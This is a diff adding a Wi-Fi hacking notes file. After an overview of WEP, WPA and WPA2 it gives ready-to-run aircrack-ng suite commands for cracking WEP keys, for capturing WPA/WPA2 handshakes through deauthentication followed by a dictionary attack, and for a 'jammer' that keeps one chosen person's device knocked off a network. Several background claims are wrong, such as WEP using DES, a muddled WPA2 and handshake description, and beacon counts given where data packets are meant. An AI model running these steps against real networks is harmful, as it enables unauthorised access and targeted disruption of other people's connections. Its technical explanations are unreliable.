@@ -1,0 +1,292 @@
+
+#-------------------------------------------------Wifi Hacking------------------------------------------------#
+
+Wireless Network:-
+-----------------------------
+Wireless Networks are the networks which don't need to connect to any Network Peripheral. For eg. Bluetooths, WIFI etc. These Wireless Network came into existence because when we were using physical networks, it was very difficult to maintain and to spend expenses on various physical mediums required for establishing connection with end users used in Physical Network. Physical Medium includes Switches, Hubs, Cables, Connections, and Maintenances etc.
+
+WIFI ALLIANCE - Organization
+
+For using these Wireless Networks, there is an standard which sets Rules and Regulations to use Wireless Networks for using Internet named as "IEEE 802.11" .
+
+ They derive a term known as WIFI, which means Wireless Fidelity.
+
+The IEEE 802.11 execute the action of WIFI VIA a router having DHCP inbuilt in it. First company to come with this technology of wireless router was DLINK.
+
+Need Of Wireless Security
+=========================
+Nowadays every Smart Device is using Wireless Networking. If a Wireless Network is not secured it will leads to manipulation and illegal use of all those Devices connected to that Network.
+Unauthorized users like hackers can easily intercept your data by MITM.
+Attacker can spread Viruses, worms, and Trojan horses in the whole network.
+Data interception and theft and Identity theft etc.
+
+
+#--------------------------------------------------------------------------------------------------------------------------------------------#
+
+
+Due to such security breaches, there is a vast need of Wireless Security. These Wireless Securities were as follows : 
+
+WEP (Wired Equivalent Privacy) came in year 1997 
+WPA (WiFi Protected Access)  came in year 2003
+WPA 2 WIFI Protected Access with AES/CCMP came in year 2004
+
+WEP (Wired Equivalent Privacy) 
+==============================
+WEP was designed to give wireless networks the equivalent level of privacy protection as a comparable wired network, but technical flaws greatly limits the use of it. Consumers who purchased 802.11b/g routers in the early 2000s had no practical Wi-Fi security options available other than WEP. WEP uses RC4 ALGORITHM and DES Encryption, which is easy to break. The problem with WEP is that the key is static, which is vulnerable, means by using some tools a hacker could use reverse-engineering to extract the encryption key. This process affects the transmission speed.
+
+WPA (WiFi Protected Access)
+============================
+It was developed in response to the weaknesses of WEP, and therefore improves on WEP's authentication and encryption features. WPA make it more secure by adding extra security mechanism and algorithms to stop unauthorized access. WPA delivers a level of security way beyond anything that WEP can offer. WPA need support of RADIUS (Remote Authentication Dial-in User Service)Servers which helps in Authentication of the users.
+
+WPA 2 (WIFI Protected Access with AES/CCMP)
+============================================
+WPA2 was same as WPA, the only difference is for providing stronger encryption than WEP through use of either of two standard technologies: Temporal Key Integrity Protocol (TKIP) and Advanced Encryption Standard (AES) with Pre-Shared Keys(PSK).
+
+
+#-------------------------------------------------------------------------------------------------------------------------------------#
+
+
+ENCRYPTIONS
+=============
+
+AES : The Advanced Encryption Standard, or AES, is a symmetric block cipher chosen by the U.S. government to protect classified information, passphrases and other things using symmetric key algorithm.
+
+DES : The Data Encryption Standard (DES) is an outdated symmetric-key method of data encryption. DES works by using the same key to encrypt and decrypt a message, so both the sender and the receiver must know and use the same private key.
+
+TKIP : Temporal Key Integrity Protocol is an encryption protocol included as part of the IEEE 802.11 standard for wireless LANs (WLANs). 
+
+PSK : PSK is used in Wi-Fi encryption such as Wired Equivalent Privacy (WEP), Wi-Fi Protected Access (WPA), where the method is called WPA-PSK or WPA2-PSK which was previously shared between the two parties using some secure channel before it needs to be used.
+
+CCMP : Counter Mode Cipher Block Chaining Message Authentication Code Protocol is an enhanced data cryptographic encapsulation mechanism designed for data confidentiality which was created to address the vulnerabilities presented by WEP, a dated, insecure protocol.
+
+
+#------------------------------------------------------------------------------------------------------------------------------------------#
+
+
+SECURITY CONFIGURATIONS
+=========================
+
+Keeping password security strong and possibly unbreakable
+
+
+chillypannerr@234 		c#i77YP4n333@234
+
+ Use minimum 8 characters as the password
+ Use alphabet in both cases  > pASSwOrD
+ Use number in the password > p3$$w0rd
+ Use special character. Eg. -  a-@ , e-3, h-# etc.
+   
+
+Website - https://howsecureismypassword.net/
+                            
+
+#---------------------------------------------------------------------------------------------------------------------------------------#
+
+
+WORDLISTS GENERATOR
+===================
+
+CRUNCH
+======
+Usage  :  TERMINAL : crunch minlength maxlength characterset
+
+
+#---------------------------------------------------------------------------------------------------------------------------------------#
+
+
+WIFI HANDSHAKE
+===============
+The four-way handshake is designed so that the access point (or authenticator) and wireless client (or supplicant) can independently prove to each other that they are the authenticated and correct.
+
+=	The Access Point sends the Nonce(used only once) Packet to the Client.
+=	The Client uses the Nonce Packet for the Authentication process.
+=	The AP responds with Broadcasting, Multicasting Messages of Authentication.
+=	The Client accepts the broadcasting packet and responds with Acknowledgement Packet (ACK) which helps in further connecting to the  AP.
+
+
+
+CAPTURING WIRELESS COMMUNICATION PACKETS
+==========================================
+
+Attacker’s Machine - Kali OS
+Device Used -  Leoxsys External WIFI Adapter - 150HGN : https://www.amazon.in/Leoxsys-150Mbps-Wireless-external-LEO-HG150N/dp/B00IWT1JA6
+Tool - Airmon-ng , Airodump-ng (Non-Graphical)
+
+
+Modes of Using a Wireless Adapter :
+
+=	Standard Mode | Managed Mode : Which every Layman use to access and use the services of a particular Access Point.
+
+=	Monitoring Mode : The mode which allows a computer with a wireless network interface controller to monitor all traffic received from the wireless network.
+
+TERMINOLOGIES
+===============
+Beacons : Number of beacons sent by the AP. Each access point sends about ten beacons per second at the lowest rate (1M), so they can usually be picked up from very far
+
+#Data  : Number  of  captured  data packets (if WEP, unique IV count), including data broadcast packets.
+
+#s : Number of data packets per second measure over the last 10 seconds.
+
+CH : Channel number (taken from beacon packets). Note: sometimes packets from  other  channels are captured even if airodump-ng is not hopping, because of radio interference.
+
+MB : Maximum  speed supported by the AP. The dot (after 54 above)  indicates  short  preamble  is supported. 'e' indicates that the network has QoS (802.11e) enabled.
+
+ENC : Encryption  algorithm  in  use. OPN = no encryption,"WEP?" = WEP or higher (not enough data to choose between WEP and WPA/WPA2), WEP (without the  question  mark)  indicates static or dynamic WEP, and WPA or WPA2 if TKIP or CCMP or MGT is present.
+
+CIPHER : The  cipher  detected.  One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP is typically used with WPA and CCMP is typically used  with  WPA2. 
+
+AUTH :  The authentication protocol used. One of MGT (WPA/WPA2 using a separate authentication server), SKA (shared key for WEP), PSK (pre-shared key for WPA/WPA2).
+
+WPS :  This is only displayed when --wps (or -W) is specified. If the AP  supports  WPS,  the first  field of the column indicates version supported.
+
+ESSID  : The name of the AP.
+
+BSSID : MAC Address of the Access Point.
+
+
+#-------------------------------------------------------------------------------------------------------------------------------------------#
+
+
+
+DEMONSTRATION
+===============
+
+Opening up Kali Machine and using tools.
+
+Airmon-ng in the terminal which will be used to activate the Monitoring Mode. This script can be used to enable monitor mode on wireless interfaces. It may also be used to go back from monitor mode to managed mode. Entering the airmon-ng command without parameters will show  the  interfaces status.  It can also list/kill programs that can interfere with the wireless card operation.
+
+Command:-
+-------------------
+$ iwconfig
+$ airmon-ng start wlan0 //Starting Monitoring Mode on wlan
+$ airmon-ng kill PIDs
+$ iwconfig - wlan0mon
+
+Starting Dumping Packets through another tool, Airodump-ng. airodump-ng  is  used  for packet capturing of raw 802.11 frames for the intent of using them. Additionally, airodump-ng writes out a text file containing the details of all access points and clients seen.
+
+Command:-
+-------------------
+$ airodump-ng wlan0mon // start dumping on wlan0mon
+$ airodump-ng --bssid <bssid name> -c <CH number> -w <filename> wlan0mon //start capturing and dumping the packets and storing it on the Kali OS.
+
+
+REQUIREMENTS FOR CRACKING WIRELESS NETWORKS
+============================================
+
+OS : Kali Linux
+Hardware Components : Wireless Adapter that supports Monitor Mode (Using "Leoxsys 150 HGN") 
+Tools : 	(CLI Tools Pre-Installed in Kali Linux)
+-	Airmon-ng : For  Enabling Monitor Mode.
+-	Airodump-ng : For Dumping Wireless Fidelity Packets.
+-	Aireplay-ng : For generating frames/packets and altering with Network Packets.
+-	Aircrack-ng : For Doing Brute Force Attack on the WIFI Captured Packets through the help of a Wordlists. 
+
+
+Aireplay-ng
+============
+Aireplay-ng is used to inject/replay frames.  The primary function is to generate traffic for the later use in aircrack-ng for cracking the WEP and WPA-PSK keys. There are different attacks  which  can  cause deauthentications for the purpose of capturing WPA handshake data, fake authentications etc.
+
+
+Aircrack-ng
+===========
+Aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program. It can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This uses methods incorporates various statistical attacks to discover the WEP key and uses these in combination with brute forcing. Additionally, the program offers a dictionary method for determining the WEP key. For  cracking WPA/WPA2 pre-shared keys, a wordlist (file having credentials) has to be used.
+
+
+Workflow for Cracking WEP, WPA/WPA2:
+====================================
+
+Step 1: To start the monitor mode.
+Step 2: To start gathering information about the wireless signals.
+Step 3: To start capturing the packets.
+Step 4: Cracking the WiFi password.
+
+
+#--------------------------------------------------------------------------------------------------------------------------------------------#
+
+
+CRACKING WEP ENCRYPTION
+========================
+
+Steps : 
+
+# iwconfig                    // Wireless Adapter Name wlan0
+
+# airmon-ng start wlan0       // Starting Monitoring Mode on Adapter
+
+# kill PID                    // Killing processes
+
+# iwconfig                    // After Monotoring mode adapter name is : wlan0mon
+
+# airodump-ng wlan0mon        // Starting Dumping on Wireless Adapter
+
+# airodump-ng --bssid <Target Router's bssid> -c <channel number> -w wepp wlan0mon            // saving dumping packets to a file.
+	--bssid : router's mac address
+	-c 		: channel number
+	-w 		: writing/capturing wireless packets
+(This will automatically adds -01,-02 in addition to the file name. Here it'll be wepp-01.cap .)
+
+# aireplay-ng -1 0 -a <bssid of my wep router> wlan0mon        // Sending Re-authentication packets to the router
+
+NOTE : There must be atleast 15,000 Beacon Packets Captured.
+
+# aircrack-ng wepp-01.cap           // Cracking Stored WEP Packets 
+
+
+The key will be found with (:) in between. For eg. If the passphrase of the access point is "1234567890" , the Cracked Key will be shown as "12:34:56:78:90" . 
+Remove the (:) sign from the KEY Founded, and the password will be in front of you. 
+
+
+--------------------------------------------------------------------------------------------------
+
+
+CRACKING WPA/WPA2
+==================
+
+Steps : 
+
+# iwconfig                    // Wireless Adapter Name wlan0
+
+# airmon-ng start wlan0       // Starting Monitoring Mode on Adapter
+
+# kill PID                    // Killing processes
+
+# iwconfig                    // After Monotoring mode adapter name is : wlan0mon
+
+# airodump-ng wlan0mon        // Starting Dumping on Wireless Adapter 
+
+# airodump-ng --bssid <Target Router's bssid> -c <channel number> -w wpa2 wlan0mon      // saving dumping packets to a file.
+	--bssid :  router's mac address
+	  -c 	: channel number
+	  -w 	: to write/capture packets
+(This will automatically adds -01,-02 in addition to the file name. Here it'll be wpa2-01.cap .)
+
+# aireplay-ng -0 10 -a <bssid of router> -c <bssid of client/user> wlan0mon          // Sending deauthentication packets to the client/user of a router.
+	-0 : 	deauthentication packet
+	-a : 	mac of target router
+	-c :	mac of any connected client/user
+(Now we are sending 10 Deauthentication Packets to the client, after that if the client again tries to reconnect, the WIFI Handshake will be captured of that access point.)
+
+# aircrack-ng -w <path of dictionary> <filename*.cap>       //Starting Dictionary Attack through a Wordlists
+Wordlists we are using is Rockyou.txt which is pre-installed in kali linux. Path of rockyou.txt is : /usr/share/wordlist/rockyou.txt/ .
+
+This will be showing you the password as (KEY FOUND : Password of the Access Point).
+
+
+#----------------------------------------------------------------------------------------------------------------------------------#
+
+
+CREATING WIFI JAMMER FOR A SPECIFIC PERSON
+==========================================
+
+# airodump-ng -c <chanel number> -w file --bssid <bssid of router> wlan0mon
+
+# aireplay-ng --deauth 0 -c <bssid of a specific device> -a <bssid of the router> wlan0mon
+
+
+#----------------------------------------------------------------------------------------------------------------------------------#
+
+
+Other Automated Tool For Wireless Cracking:-
+-------------------------------------------------------------------
+
+FLUXION - https://github.com/FluxionNetwork/fluxion 
